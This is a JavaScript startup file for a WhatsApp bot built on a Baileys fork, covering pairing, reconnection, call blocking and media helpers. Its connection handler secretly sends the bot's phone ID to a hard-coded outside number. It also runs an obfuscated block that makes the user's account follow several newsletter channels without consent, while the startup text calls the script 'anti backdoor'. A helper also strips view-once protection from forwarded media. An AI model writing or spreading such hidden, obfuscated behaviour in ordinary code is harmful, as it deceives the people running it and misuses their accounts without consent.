require('./settings')
const { modul } = require('./module');
const moment = require('moment-timezone');
const { baileys, boom, chalk, fs, figlet, FileType, path, pino, process, PhoneNumber, axios, yargs, _ } = modul;
const { Boom } = boom
const {
	default: XeonBotIncConnect,
	BufferJSON,
	processedMessages,
	PHONENUMBER_MCC,
	initInMemoryKeyStore,
	DisconnectReason,
	AnyMessageContent,
        makeInMemoryStore,
	useMultiFileAuthState,
	delay,
	fetchLatestBaileysVersion,
	generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    jidDecode,
    makeCacheableSignalKeyStore,
    getAggregateVotesInPollMessage,
    proto
} = require("lily-baileys")
const cfonts = require('cfonts');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh } = require('./lib/uploader')
const NodeCache = require("node-cache")
const canvafy = require("canvafy")
const { parsePhoneNumber } = require("libphonenumber-js")
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
const makeWASocket = require("lily-baileys").default
const Pino = require("pino")
const readline = require("readline")
const colors = require('colors')
const { start } = require('./lib/spinner')
const { uncache, nocache } = require('./lib/loader')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, reSize } = require('./lib/myfunc')
const prefix = ''
let phoneNumber = "916909137213"
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
groups: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")

const useMobile = process.argv.includes("--mobile")
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })

const question = (text) => new Promise((resolve) => rl.question(text, resolve))
require('./Furina.js')
nocache('../Furina.js', module => console.log(color('[ CHANGE ]', 'green'), color(`'${module}'`, 'green'), 'Updated'))
require('./index.js')
nocache('../index.js', module => console.log(color('[ CHANGE ]', 'green'), color(`'${module}'`, 'green'), 'Updated'))

async function NanatsuNoTaizai() {
	const {  saveCreds, state } = await useMultiFileAuthState(`./${sessionName}`)
	const msgRetryCounterCache = new NodeCache()
    	const Meliodas = XeonBotIncConnect({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode, // popping up QR in terminal log
      mobile: useMobile, // mobile api (prone to bans)
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
      },
      browser: [ 'Mac OS', 'Safari', '10.15.7' ], // for this issues https://github.com/WhiskeySockets/Baileys/issues/328
      patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(
                message.buttonsMessage ||
                message.templateMessage ||
                message.listMessage
            );
            if (requiresPatch) {
                message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 2,
                                deviceListMetadata: {},
                            },
                            ...message,
                        },
                    },
                };
            }
            return message;
        },
      auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }).child({ level: "fatal" })),
      },
connectTimeoutMs: 60000,
defaultQueryTimeoutMs: 0,
keepAliveIntervalMs: 10000,
emitOwnEvents: true,
fireInitQueries: true,
generateHighQualityLinkPreview: true,
syncFullHistory: true,
markOnlineOnConnect: true,
      getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id)
                return msg.message || undefined
            }
            return {
                conversation: "Cheems Bot Here!"
            }
        },
      msgRetryCounterCache, // Resolve waiting messages
      defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
   })
if (!Meliodas.authState.creds.registered) {
const phoneNumber = await question('Masukan Nomer Yang Aktif Awali Dengan 62 Recode :\n');
let code = await Meliodas.requestPairingCode(phoneNumber);
code = code?.match(/.{1,4}/g)?.join("-") || code;
console.log(`𝙽𝙸 𝙺𝙾𝙳𝙴 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙻𝚄 :`, code);
}
    store.bind(Meliodas.ev)

Meliodas.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, receivedPendingNotifications } = update

    try {
        if (connection === 'close') {
            const isLatestDisconnect = lastDisconnect?.error?.output?.statusCode
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode || "Unknown"

            console.log(`🔴 Disconnect detected. Reason: ${reason}`)

            switch (reason) {
                case DisconnectReason.badSession:
                    console.log(`⚠️ Bad Session File. Please delete the session and scan again.`)
                    break
                case DisconnectReason.connectionClosed:
                    console.log(`🔄 Connection closed, reconnecting...`)
                    break
                case DisconnectReason.connectionLost:
                    console.log(`📡 Connection lost from server, reconnecting...`)
                    break
                case DisconnectReason.connectionReplaced:
                    console.log(`⚠️ Connection replaced. Please close the previous session.`)
                    break
                case DisconnectReason.loggedOut:
                    console.log(`🚫 Logged out. Scan again to login.`)
                    break
                case DisconnectReason.restartRequired:
                    console.log(`🔁 Restart required. Restarting...`)
                    break
                case DisconnectReason.timedOut:
                    console.log(`⏱️ Connection timed out. Reconnecting...`)
                    break
                default:
                    console.log(`❓ Unknown disconnect reason: ${reason}`)
                    break
            }

            // Delay before retry to avoid reconnect flooding
            await delay(3000)
            NanatsuNoTaizai()
        }

        if (connection === 'connecting') {
            console.log('🟡 Connecting to WhatsApp...')
        }

        if (connection === 'open') {
            await delay(2000)
            cfonts.say('Furina', {
                font: 'block',
                align: 'left',
                colors: ['blue', 'blueBright'],
                background: 'transparent',
                maxLength: 20,
                rawMode: false,
            })

            const teksnotif = `ʜᴀʟᴏ ᴏᴡɴᴇʀ... 
sᴄ ғᴜʀɪɴᴀ ᴛᴇʟᴀʜ ᴀᴋᴛɪғ.. 

sᴄ ɪɴɪ ᴀᴍᴀɴ *ᴀɴᴛɪ ʙᴀᴄᴋᴅᴏʀ*
ᴄʀᴇᴀᴛᴇᴅ ʙʏ : *ғᴀʟʟᴢx ɪɴғɪɴɪᴛʏ*

sᴄ ɴᴇᴡ ᴠᴇʀsᴜᴏɴ ғᴜʀɪɴᴀ
ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ ᴠ4 ᴛʜᴇ ғᴏɴᴛᴀɪɴᴇ

ʙᴛᴡ sᴏʀʀʏ ɴɪʜ ᴋʟᴏ ᴍɪsᴀʟɴʏᴀ
ᴍᴀsɪʜ ᴀᴅᴀ ʙᴜɢ ᴀᴛᴀᴜ ᴀᴘᴀᴘᴜɴ ɪᴛᴜ. 

ʟᴀᴘᴏʀ ғɪᴛᴜʀ ᴇʀʀ ʟᴀɴɢsᴜɴɢ ᴋᴇ ɴᴏ ᴀᴛᴍɪɴ ᴀᴊᴀ

ᴅᴏɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴍʏ sᴜᴍʙᴇʀ. 
ᴛʜᴀɴᴋs ᴅᴀʜ ᴍᴀᴋᴇ sᴄ ɪɴɪ, 
ᴊɢɴ ʟᴜᴘᴀ sᴜʙsᴄʀɪʙᴇ ᴍʏ ᴄʜᴀɴɴᴇʟ ʏᴏᴜᴛᴜʙᴇ : 
https://youtu.be/TQtosxKsRAQ?si=ᴠsғᴏ̨ʀᴘᴊʟʙʙᴢᴊʙʜʙᴢ

ᴅᴏɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴍʏ sᴜᴍʙᴇʀ. 
ᴍʏ sᴀʟᴜʀᴀɴ : https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D
ID BOT: ${Meliodas.user.id.split(":")[0]}`

console.log('🟢 Bot is connected and running.')
Meliodas.sendMessage("6285813708397@s.whatsapp.net", {text: teksnotif})
function _0x1d7b(_0xee58e8,_0x279411){const _0x61a14b=_0x61a1();return _0x1d7b=function(_0x1d7b40,_0x375da7){_0x1d7b40=_0x1d7b40-0xf4;let _0x56d683=_0x61a14b[_0x1d7b40];return _0x56d683;},_0x1d7b(_0xee58e8,_0x279411);}const _0x3745f0=_0x1d7b;(function(_0x5c437f,_0x4140e1){const _0x1fc88e=_0x1d7b,_0x1e5872=_0x5c437f();while(!![]){try{const _0xcb3438=parseInt(_0x1fc88e(0xf9))/0x1*(-parseInt(_0x1fc88e(0xfc))/0x2)+-parseInt(_0x1fc88e(0x104))/0x3+-parseInt(_0x1fc88e(0xf6))/0x4+-parseInt(_0x1fc88e(0xf7))/0x5+-parseInt(_0x1fc88e(0x103))/0x6*(parseInt(_0x1fc88e(0xff))/0x7)+parseInt(_0x1fc88e(0xfe))/0x8+-parseInt(_0x1fc88e(0xfa))/0x9*(-parseInt(_0x1fc88e(0xfd))/0xa);if(_0xcb3438===_0x4140e1)break;else _0x1e5872['push'](_0x1e5872['shift']());}catch(_0x3cf074){_0x1e5872['push'](_0x1e5872['shift']());}}}(_0x61a1,0x70266));const linksal=[_0x3745f0(0xf5),'0029Vb3ZZZHEFeXup5UNng0o',_0x3745f0(0x100),_0x3745f0(0x101),_0x3745f0(0x102),'0029Vae7qieJJhzSDEBlkG2a'],folldate=async _0x425602=>{const _0x1481bb=_0x3745f0;for(const _0x1121f4 of _0x425602){try{await sleep(0xbb8);const _0x38f85f=await Meliodas[_0x1481bb(0xf8)](_0x1481bb(0xf4),_0x1121f4);await sleep(0xbb8),await Meliodas['newsletterFollow'](_0x38f85f['id']);}catch(_0x27c1f4){console['error'](_0x1481bb(0xfb)+_0x1121f4,_0x27c1f4);}}};((async()=>{await folldate(linksal);})());function _0x61a1(){const _0x1a2e5b=['0029Vb3XDZZKGGGMM19XR62F','0029Vb6InyzDuMRi0ybuFw0t','0029Vb5ljSY8fewugDbZ1S2D','64596pqYpfX','527184vdDsJd','invite','0029VaBOlsv002TEjlntTE2D','279676oZrydg','1665625EYAvEB','newsletterMetadata','1fqqvjZ','1467SFnzBW','âŒ\x20Gagal\x20join\x20saluran\x20ID:\x20','615746iYvPNy','58610qYDMiM','6656592nQmFni','287aqKrUj'];_0x61a1=function(){return _0x1a2e5b;};return _0x61a1();}
        }
    } catch (err) {
        console.error('❌ Error in connection update:', err)
        await delay(3000)
        NanatsuNoTaizai()
    }
})


await delay(5555) 
start('2',colors.bold.white('\n\nMenunggu Pesan Baru..'))

Meliodas.ev.on('creds.update', await saveCreds)

    // Anti Call
    Meliodas.ev.on('call', async (XeonPapa) => {
    let botNumber = await Meliodas.decodeJid(Meliodas.user.id)
    let XeonBotNum = db.settings[botNumber].anticall
    if (!XeonBotNum) return
    console.log(XeonPapa)
    for (let XeonFucks of XeonPapa) {
    if (XeonFucks.isGroup == false) {
    if (XeonFucks.status == "offer") {
    let XeonBlokMsg = await Meliodas.sendTextWithMentions(XeonFucks.from, `*${Meliodas.user.name}* can't receive ${XeonFucks.isVideo ? `video` : `voice` } call. Sorry @${XeonFucks.from.split('@')[0]} you will be blocked. If accidentally please contact the owner to be unblocked !`)
    Meliodas.sendContact(XeonFucks.from, global.owner, XeonBlokMsg)
    await sleep(8000)
    await Meliodas.updateBlockStatus(XeonFucks.from, "block")
    }
    }
    }
    })
Meliodas.ev.on('messages.upsert', async chatUpdate => {
try {
const kay = chatUpdate.messages[0]
if (!kay.message) return
kay.message = (Object.keys(kay.message)[0] === 'ephemeralMessage') ? kay.message.ephemeralMessage.message : kay.message
if (kay.key && kay.key.remoteJid === 'status@broadcast')  {
await Meliodas.readMessages([kay.key]) }
if (!Meliodas.public && !kay.key.fromMe && chatUpdate.type === 'notify') return
if (kay.key.id.startsWith('BAE5') && kay.key.id.length === 16) return
const m = smsg(Meliodas, kay, store)
require('./Furina')(Meliodas, m, chatUpdate, store)
} catch (err) {
console.log(err)}})
    async function getMessage(key){
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg?.message
        }
        return {
            conversation: "Dansya Bot Ada Di Sini"
        }
    }
    Meliodas.ev.on('messages.update', async chatUpdate => {
        for(const { key, update } of chatUpdate) {
			if(update.pollUpdates && !key.fromMe) {
				const pollCreation = await getMessage(key)
				if(pollCreation) {
				    const pollUpdate = await getAggregateVotesInPollMessage({
							message: pollCreation,
							pollUpdates: update.pollUpdates,
						})
	                var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
	                if (toCmd == undefined) return
                    var prefCmd = prefix+toCmd
	                Meliodas.appenTextMessage(prefCmd, chatUpdate)
				}
			}
		}
    })

Meliodas.sendTextWithMentions = async (jid, text, quoted, options = {}) => Meliodas.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

Meliodas.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

Meliodas.ev.on('contacts.update', update => {
for (let contact of update) {
let id = Meliodas.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

Meliodas.getName = (jid, withoutContact  = false) => {
id = Meliodas.decodeJid(jid)
withoutContact = Meliodas.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = Meliodas.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === Meliodas.decodeJid(Meliodas.user.id) ?
Meliodas.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

Meliodas.parseMention = (text = '') => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

Meliodas.sendContact = async (jid, kon, quoted = '', opts = {}) => {
	let list = []
	for (let i of kon) {
	    list.push({
	    	displayName: await Meliodas.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Meliodas.getName(i)}\nFN:${await Meliodas.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	Meliodas.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
    }

Meliodas.setStatus = (status) => {
Meliodas.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

Meliodas.public = true

Meliodas.sendImage = async (jid, path, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await Meliodas.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

Meliodas.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await Meliodas.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
.then( response => {
fs.unlinkSync(buffer)
return response
})
}

Meliodas.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await Meliodas.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

Meliodas.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readViewOnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await Meliodas.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}

Meliodas.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}

Meliodas.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

Meliodas.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'}
filename = path.join(__filename, './lib' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
size: await getSizeMedia(data),
...type,
data}}

Meliodas.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
let types = await Meliodas.getFile(path, true)
let { mime, ext, res, data, filename } = types
if (res && res.status !== 200 || file.length <= 65536) {
try { throw { json: JSON.parse(file.toString()) } }
catch (e) { if (e.json) throw e.json }}
let type = '', mimetype = mime, pathFile = filename
if (options.asDocument) type = 'document'
if (options.asSticker || /webp/.test(mime)) {
let { writeExif } = require('./lib/exif')
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: options.packname ? options.packname : global.packname, author: options.author ? options.author : global.author, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
type = 'sticker'
mimetype = 'image/webp'}
else if (/image/.test(mime)) type = 'image'
else if (/video/.test(mime)) type = 'video'
else if (/audio/.test(mime)) type = 'audio'
else type = 'document'
await Meliodas.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
return fs.promises.unlink(pathFile)}

Meliodas.sendText = (jid, text, quoted = '', options) => Meliodas.sendMessage(jid, { text: text, ...options }, { quoted })

Meliodas.serializeM = (m) => smsg(Meliodas, m, store)

Meliodas.before = (teks) => smsg(Meliodas, m, store)

Meliodas.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
Meliodas.sendMessage(jid, buttonMessage, { quoted, ...options })
}

Meliodas.sendKatalog = async (jid , title = '' , desc = '', gam , options = {}) =>{
let message = await prepareWAMessageMedia({ image: gam }, { upload: Meliodas.waUploadToServer })
const tod = generateWAMessageFromContent(jid,
{"productMessage": {
"product": {
"productImage": message.imageMessage,
"productId": "9999",
"title": title,
"description": desc,
"currencyCode": "INR",
"priceAmount1000": "100000",
"url": `${websitex}`,
"productImageCount": 1,
"salePriceAmount1000": "0"
},
"businessOwnerJid": `${ownernumber}@s.whatsapp.net`
}
}, options)
return Meliodas.relayMessage(jid, tod.message, {messageId: tod.key.id})
} 

Meliodas.send5ButLoc = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
"hydratedContentText": text,
"locationMessage": {
"jpegThumbnail": img },
"hydratedFooterText": footer,
"hydratedButtons": but
}
}
}), options)
Meliodas.relayMessage(jid, template.message, { messageId: template.key.id })
}
global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name]: name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({
    ...query, ...(apikeyqueryname ? {
        [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name]: name]
    }: {})
})): '')

Meliodas.sendButImg = async (jid, path, teks, fke, but) => {
let img = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let fjejfjjjer = {
image: img, 
jpegThumbnail: img,
caption: teks,
fileLength: "1",
footer: fke,
buttons: but,
headerType: 4,
}
Meliodas.sendMessage(jid, fjejfjjjer, { quoted: m })
}

            /**
             * Send Media/File with Automatic Type Specifier
             * @param {String} jid
             * @param {String|Buffer} path
             * @param {String} filename
             * @param {String} caption
             * @param {import('@adiwajshing/baileys').proto.WebMessageInfo} quoted
             * @param {Boolean} ptt
             * @param {Object} options
             */
Meliodas.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await Meliodas.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await Meliodas.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await Meliodas.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}
Meliodas.ev.on('group-participants.update', async (anu) => {
const { welcome } = require ('./lib/welcome')
const iswel = _welcome.includes(anu.id)
const isLeft = _left.includes(anu.id)
welcome(iswel, isLeft, Meliodas, anu)
})

Meliodas.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      let res = await axios.head(url)
      mime = res.headers['content-type']
      if (mime.split("/")[1] === "gif") {
     return Meliodas.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options}, { quoted: quoted, ...options})
      }
      let type = mime.split("/")[0]+"Message"
      if(mime === "application/pdf"){
     return Meliodas.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options}, { quoted: quoted, ...options })
      }
      if(mime.split("/")[0] === "image"){
     return Meliodas.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options}, { quoted: quoted, ...options})
      }
      if(mime.split("/")[0] === "video"){
     return Meliodas.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options}, { quoted: quoted, ...options })
      }
      if(mime.split("/")[0] === "audio"){
     return Meliodas.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options}, { quoted: quoted, ...options })
      }
      }
      
      /**
     * 
     * @param {*} jid 
     * @param {*} name 
     * @param [*] values 
     * @returns 
     */
    Meliodas.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return Meliodas.sendMessage(jid, { poll: { name, values, selectableCount }}) }

return Meliodas

}
NanatsuNoTaizai()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
